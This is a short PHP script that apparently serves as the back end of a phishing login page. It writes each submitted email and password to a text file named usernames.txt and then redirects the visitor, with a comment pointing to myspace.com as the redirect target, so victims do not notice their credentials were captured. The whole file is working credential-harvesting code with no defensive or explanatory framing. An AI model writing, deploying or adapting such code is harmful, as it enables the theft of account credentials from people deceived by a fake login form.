<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://myspace.com
header("Location: $url");
exit();
